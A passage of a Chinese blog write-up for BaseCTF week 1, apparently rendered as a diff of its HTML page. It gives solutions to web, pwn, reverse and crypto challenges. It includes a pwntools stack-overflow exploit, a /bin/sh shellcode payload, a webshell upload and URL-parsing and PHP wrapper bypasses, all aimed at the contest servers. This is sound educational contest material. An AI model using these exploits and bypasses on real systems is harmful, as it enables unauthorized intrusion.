&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;, &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"># 使用步骤1中生成的md5_dict来恢复字符串  </span><br><span class="line">recovered_string = recover_string_from_md5_list(md5_list, md5_dict)  </span><br><span class="line">print(recovered_string)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a><strong>[Week1] HTTP 是什么呀</strong></h2><p>满足题目所有要求<br><img src="/2024/08/18/basectf-week1-wp/web_1_1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/web_1_2.png" alt="text"> </p>
+<p>就能在网络包里发现flag<br><img src="/2024/08/18/basectf-week1-wp/web_1_3.png" alt="text"> </p>
+<h2 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•&#96;"></a>[Week1] 喵喵喵´•ﻌ•&#96;</h2><p>easy<br><img src="/2024/08/18/basectf-week1-wp/web_2.png" alt="alt text"></p>
+<h2 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h2><p>md5函数不能接受数组<br>会返回false<br>弱比较和强比较都能绕<br><img src="/2024/08/18/basectf-week1-wp/web_3.png" alt="alt text"></p>
+<h2 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a><strong>[Week1] A Dark Room</strong></h2><p>我也玩过<br>flag在注释里<br><img src="/2024/08/18/basectf-week1-wp/web_4.png" alt="alt text"></p>
+<h2 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h2><p>直接传马上去就行了<br><img src="/2024/08/18/basectf-week1-wp/web_5_1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/web_5_2.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/web_5_3.png" alt="text"></p>
+<h2 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h2><p>pen检查用伪协议data%3A%2F%2Ftext%2Fplain%3Bbase64%2CQXVyYQ%3D%3D过<br>challenge难点</p>
+<ol>
+<li>需要以<a target="_blank" rel="noopener" href="http://jasmineaura.github.io开头/">http://jasmineaura.github.io开头</a></li>
+<li>需要让访问到的内容包含已经收到Kengwang的礼物啦</li>
+</ol>
+<p>而这个网页指向的博客,在题目开始的时候,有一篇文章却是包含了已经收到Kengwang的礼物啦<br>但后来被删了,我没来得及蹭到<br>所以通过url的奇妙结构<br><a href="http://jasmineaura.github.io@truthleader.github.io/">http://jasmineaura.github.io@truthleader.github.io</a></p>
+<p>@后面的才会被当作域名解析<br>然后用gift直接包含得不到flag,所以用任意文件读取的伪协议<br><img src="/2024/08/18/basectf-week1-wp/web_6_1.png" alt="alt text"> </p>
+<p>base64解密<br><img src="/2024/08/18/basectf-week1-wp/web_6_2.png" alt="alt text"></p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Week1-签个到吧"><a href="#Week1-签个到吧" class="headerlink" title="[Week1] 签个到吧"></a><strong>[Week1] 签个到吧</strong></h2><p>nc challenge.basectf.fun 32200<br>cat &#x2F;flag直接有</p>
+<p><img src="/2024/08/18/basectf-week1-wp/pwn_qiandao.png"></p>
+<h2 id="Week1-echo"><a href="#Week1-echo" class="headerlink" title="[Week1] echo"></a><strong>[Week1] echo</strong></h2><p>用echo打印flag<br><img src="/2024/08/18/basectf-week1-wp/pwn_echo.png"></p>
+<h2 id="Week1-Ret2text"><a href="#Week1-Ret2text" class="headerlink" title="[Week1] Ret2text"></a><strong>[Week1] Ret2text</strong></h2><p>可以看到shell的地址<br><img src="/2024/08/18/basectf-week1-wp/pwn_ret2text1.png" alt="alt text"><br>而字符串大小为32<br><img src="/2024/08/18/basectf-week1-wp/pwn_ret2text2.png" alt="alt text"></p>
+<p>也就是32+8位数据填充实现栈溢出,然后用shell地址覆盖ret地址<br>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">sh = remote(&#x27;challenge.basectf.fun&#x27;,31868)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;0&#x27;*(32+8)+p64(0x4011BB)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Week1-shellcode-level0"><a href="#Week1-shellcode-level0" class="headerlink" title="[Week1] shellcode_level0"></a>[Week1] shellcode_level0</h2><p>用pwntools喵喵工具生成shellcode,直接出<br><img src="/2024/08/18/basectf-week1-wp/pwn_shellcode1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/pwn_shellcode2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/pwn_shellcode3.png" alt="alt text"> </p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">sh = process(&#x27;./shellcode_level0&#x27;)</span><br><span class="line">elf = ELF(&#x27;./shellcode_level0&#x27;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Week1-我把她丢了"><a href="#Week1-我把她丢了" class="headerlink" title="[Week1] 我把她丢了"></a>[Week1] 我把她丢了</h2><p>栈溢出的残缺后门+nx保护<br>不太懂,上网照喵画虎弄出来的<br><img src="/2024/08/18/basectf-week1-wp/pwn_wbtdl1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/pwn_wbtdl2.png" alt="alt text"></p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Week1-You-are-good-at-IDA"><a href="#Week1-You-are-good-at-IDA" class="headerlink" title="[Week1] You are good at IDA"></a><strong>[Week1] You are good at IDA</strong></h2><p>ida拖进去看的三个函数,有flag的三部分,拼起来就好了<br><img src="/2024/08/18/basectf-week1-wp/reverse_ezida3.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_ezida1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_ezida2.png" alt="text"></p>
+<h2 id="Week1-UPX-mini"><a href="#Week1-UPX-mini" class="headerlink" title="[Week1] UPX mini"></a><strong>[Week1] UPX mini</strong></h2><p>用upx妙妙工具解壳,<br>然后就看到了base秘文<br>用cyberchef妙妙工具得flag<br><img src="/2024/08/18/basectf-week1-wp/reverse_upx1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_upx2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_upx3.png" alt="alt text"></p>
+<h2 id="Week1-ez-maze"><a href="#Week1-ez-maze" class="headerlink" title="[Week1] ez_maze"></a>[Week1] ez_maze</h2><p>迷宫题<br>找到了地图和长宽数据<br><img src="/2024/08/18/basectf-week1-wp/reverse_maze1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_maze2.png" alt="text"> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">x$$$$$$$$$$$$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$</span><br><span class="line">&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$</span><br><span class="line">&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$</span><br><span class="line">&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$</span><br><span class="line">$$$$$$&amp;$$$$$$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$</span><br><span class="line">$$$$$$$$$&amp;$$&amp;$$</span><br><span class="line">$$$$$$$$$&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y</span><br></pre></td></tr></table></figure>
+
+<p>&amp;是路,$是墙,用最短路线走到y<br><img src="/2024/08/18/basectf-week1-wp/reverse_maze3.png" alt="alt text"><br>然后转md5就是flag了</p>
+<h2 id="Week1-Ez-Xor"><a href="#Week1-Ez-Xor" class="headerlink" title="[Week1] Ez Xor"></a>[Week1] Ez Xor</h2><p>用ida看到如下内容<br><img src="/2024/08/18/basectf-week1-wp/re_ezxor1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_ezxor2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_ezxor3.png" alt="alt text"> </p>
+<p>这段程序通过keystream函数生成了长度为28的key<br>然后通过encrypt函数对用户的输入进行xor运算<br>然后通过checkflag函数将加密后的用户输入和str比较</p>
+<p>由于</p>
+<ol>
+<li>key是固定生成的</li>
+<li>xor的逆运算是再xor一遍<br>所以能够用c将keystream 和 encrypt实现<br>将str作为输入<br>就能得到flag了</li>
+</ol>
+<p>str如下<br><img src="/2024/08/18/basectf-week1-wp/re_ezxor4.png" alt="alt text"> </p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt(int *v14,int *str,int v17)&#123;</span><br><span class="line">    for (int i=0;i&lt;v17;i++)&#123;</span><br><span class="line">        printf(&quot;%d&quot;, str[i]);</span><br><span class="line">        str[i]=str[i]^v14[v17-i-1];</span><br><span class="line">        printf(&quot;%d %d\n&quot;,str[i], v14[v17-i-1]);</span><br><span class="line">        // printf(&quot;%d&quot;,str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void KeyStream(int *v4,int *v14,int a3)&#123;</span><br><span class="line">    for (int i=0;i&lt;a3;i++)&#123;</span><br><span class="line">        v14[i]=i^v4[i%3];</span><br><span class="line">        // printf(&quot;%c&quot;,v14[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int v4[3]=&#123;&#x27;X&#x27;,&#x27;o&#x27;,&#x27;r&#x27;&#125;;</span><br><span class="line">    int v14[28]=&#123;88,110,112,91,107,119,94,104,122,81,101,121,84,98,124,87,127,99,74,124,102,77,121,101,64,118,104,67&#125;;</span><br><span class="line">    // int v14[28];</span><br><span class="line">    int v5[28];</span><br><span class="line">    int str[28]=&#123;1,9,5,&#x27;%&#x27;,&#x27;&amp;&#x27;,&#x27;-&#x27;,0x0B,0x1D,&#x27;$&#x27;,&#x27;z&#x27;,&#x27;1&#x27;,&#x27; &#x27;,0x1E,&#x27;I&#x27;,&#x27;=&#x27;,&#x27;g&#x27;,&#x27;M&#x27;,&#x27;P&#x27;,8,&#x27;%&#x27;,&#x27;.&#x27;,&#x27;n&#x27;,5,&#x27;4&#x27;,&#x27;\&quot;&#x27;,&#x27;@&#x27;,&#x27;;&#x27;,&#x27;%&#x27;&#125;;</span><br><span class="line">    KeyStream(&amp;v4,v14,28);</span><br><span class="line">    decrypt(v14,str,28);</span><br><span class="line"></span><br><span class="line">    // for(int i=0;i&lt;28;i++)&#123;</span><br><span class="line"></span><br><span class="line">    //     printf(&quot;%d,&quot;, v14[i]);</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;28;i++)&#123;</span><br><span class="line"></span><br><span class="line">        printf(&quot;%c&quot;, str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Week1-BasePlus"><a href="#Week1-BasePlus" class="headerlink" title="[Week1] BasePlus"></a>[Week1] BasePlus</h2><p>伪代码如下<br><img src="/2024/08/18/basectf-week1-wp/re_base1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_base2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_base3.png" alt="alt text"></p>
+<p>其加密逻辑大致是</p>
+<ol>
+<li>将用户的输入以3个字符为单位分组,不足的用0作为填充</li>
+<li>加载每个分组,通过<em>二进制运算</em>得到下标,通过secret字典产生4个密文</li>
+<li>最终的密文长度,就是分组数*4</li>
+</ol>
+<p>程序提供了加密后的flag<br>我们可以通过flag的每4个字符,和secret字典比对得到每4个下标</p>
+<p>这4个下标来自于明文的每3个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 一个字符有8bit</span><br><span class="line">(unsigned __int8)v15 &gt;&gt; 2 // 第一个字符的前6个bit</span><br><span class="line">(HIBYTE(v15) &gt;&gt; 4) | (16 * v15) &amp; 0x30 // 第二个字符的前4bit和第一个字符的后2bit</span><br><span class="line">(v16 &gt;&gt; 6) | (4 * HIBYTE(v15)) &amp; 0x3C // 第三个字符的前2个bit和第二哥字符的后4bit</span><br><span class="line">v16 &amp; 0x3F // 第三个字符的后6bit</span><br></pre></td></tr></table></figure>
+<p>总之,我们只要把所有的bit拼回去,就能得到flag</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">flag = &quot;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&quot;</span><br><span class="line">secret=&quot;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&quot;</span><br><span class="line">flag = list(flag)</span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    flag[i] = ord(flag[i]) ^ 0xE</span><br><span class="line"></span><br><span class="line">for i in range(0, len(flag),4):</span><br><span class="line">    a1=secret.index(chr(flag[i])) # v15 前6位 为00111111</span><br><span class="line">    a2=secret.index(chr(flag[i+1])) # v16的前4位和v15后2位为00001111和00110000</span><br><span class="line">    a3=secret.index(chr(flag[i+2])) # v16的后4位和v17的前2位00111100 00000011</span><br><span class="line">    a4=secret.index(chr(flag[i+3])) # v17的后6位00111111</span><br><span class="line">    v15_1 = (a2 &amp; 0b00110000)&gt;&gt;4</span><br><span class="line">    v15_2 = a1&lt;&lt; 2</span><br><span class="line">    v15 = v15_1 | v15_2</span><br><span class="line">    v16_1 = (a2 &amp; 0b00001111) &lt;&lt; 4</span><br><span class="line">    v16_2 = (a3&amp;0b00111100) &gt;&gt; 2</span><br><span class="line">    v16=v16_1|v16_2</span><br><span class="line">    v17_1=(a3&amp;0b00000011)&lt;&lt;6</span><br><span class="line">    v17_2=(a4 &amp; 0b00111111)</span><br><span class="line">    v17=v17_1|v17_2</span><br><span class="line"></span><br><span class="line">    print(chr(v15),end=&#x27;&#x27;)</span><br><span class="line">    print(chr(v16),end= &#x27;&#x27;)</span><br><span class="line">    print(chr(v17),end= &#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>一杯咖啡钱能温暖一个人的心</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="truthleader WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>truthleader
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://truthleader.github.io/2024/08/18/basectf-week1-wp/" title="basectf_week1_wp">https://truthleader.github.io/2024/08/18/basectf-week1-wp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup-basectf/" rel="tag"># writeup - basectf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/08/10/int-80h/" rel="prev" title="逆向之什么是int 80h">
+      <i class="fa fa-chevron-left"></i> 逆向之什么是int 80h
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/09/01/serialize-private-and-protected/" rel="next" title="serialize_private_and_protected">
+      serialize_private_and_protected <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E4%BD%A0%E4%B9%9F%E5%96%9C%E6%AC%A2%E5%9C%A3%E7%89%A9%E5%90%97"><span class="nav-number">1.1.</span> <span class="nav-text">[Week1] 你也喜欢圣物吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E6%A0%B9%E6%9C%AC%E8%BF%9B%E4%B8%8D%E5%8E%BB%E5%95%8A"><span class="nav-number">1.2.</span> <span class="nav-text">[Week1] 根本进不去啊!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E6%B5%B7%E4%B8%8A%E9%81%87%E5%88%B0%E4%BA%86%E9%B2%A8%E9%B1%BC"><span class="nav-number">1.3.</span> <span class="nav-text">[Week1] 海上遇到了鲨鱼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E6%AD%A3%E7%9D%80%E7%9C%8B%E8%BF%98%E6%98%AF%E5%8F%8D%E7%9D%80%E7%9C%8B%E5%91%A2%EF%BC%9F"><span class="nav-number">1.4.</span> <span class="nav-text">[Week1] 正着看还是反着看呢？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-Base"><span class="nav-number">1.5.</span> <span class="nav-text">[Week1] Base</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E7%94%A8Python"><span class="nav-number">1.6.</span> <span class="nav-text">[Week1] 人生苦短，我用Python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E6%8D%82%E4%BD%8FX%E5%8F%AA%E8%80%B3"><span class="nav-number">1.7.</span> <span class="nav-text">[Week1] 捂住X只耳</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E5%80%92%E8%AE%A1%E6%97%B6%EF%BC%9F%E6%B5%B7%E6%8A%A5%EF%BC%81%EF%BC%88%E5%8C%85%E6%8B%AC%E5%85%AC%E5%BC%80%E7%89%88%E5%92%8C%E5%85%AC%E5%BC%80%E5%89%8D%EF%BC%89"><span class="nav-number">1.8.</span> <span class="nav-text">[Week1] 倒计时？海报！（包括公开版和公开前）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E7%AD%BE%E5%88%B0%EF%BC%81DK-%E7%9B%BE%EF%BC%81"><span class="nav-number">1.9.</span> <span class="nav-text">[Week1] 签到！DK 盾！</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-ez-rsa"><span class="nav-number">2.1.</span> <span class="nav-text">[Week1] ez_rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-babypack"><span class="nav-number">2.2.</span> <span class="nav-text">[Week1] babypack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-babyrsa"><span class="nav-number">2.3.</span> <span class="nav-text">[Week1] babyrsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E5%8D%81%E4%B8%83%E5%80%8D"><span class="nav-number">2.4.</span> <span class="nav-text">[Week1] 十七倍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-helloCrypto"><span class="nav-number">2.5.</span> <span class="nav-text">[Week1] helloCrypto</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E4%BD%A0%E4%BC%9A%E7%AE%97md5%E5%90%97"><span class="nav-number">2.6.</span> <span class="nav-text">[Week1] 你会算md5吗</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">3.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-HTTP-%E6%98%AF%E4%BB%80%E4%B9%88%E5%91%80"><span class="nav-number">3.1.</span> <span class="nav-text">[Week1] HTTP 是什么呀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E5%96%B5%E5%96%B5%E5%96%B5%C2%B4%E2%80%A2%EF%BB%8C%E2%80%A2"><span class="nav-number">3.2.</span> <span class="nav-text">[Week1] 喵喵喵´•ﻌ•&#96;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-md5%E7%BB%95%E8%BF%87%E6%AC%B8"><span class="nav-number">3.3.</span> <span class="nav-text">[Week1] md5绕过欸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-A-Dark-Room"><span class="nav-number">3.4.</span> <span class="nav-text">[Week1] A Dark Room</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-upload"><span class="nav-number">3.5.</span> <span class="nav-text">[Week1] upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-Aura-%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9"><span class="nav-number">3.6.</span> <span class="nav-text">[Week1] Aura 酱的礼物</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">4.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="nav-number">4.1.</span> <span class="nav-text">[Week1] 签个到吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-echo"><span class="nav-number">4.2.</span> <span class="nav-text">[Week1] echo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-Ret2text"><span class="nav-number">4.3.</span> <span class="nav-text">[Week1] Ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-shellcode-level0"><span class="nav-number">4.4.</span> <span class="nav-text">[Week1] shellcode_level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-%E6%88%91%E6%8A%8A%E5%A5%B9%E4%B8%A2%E4%BA%86"><span class="nav-number">4.5.</span> <span class="nav-text">[Week1] 我把她丢了</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">5.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-You-are-good-at-IDA"><span class="nav-number">5.1.</span> <span class="nav-text">[Week1] You are good 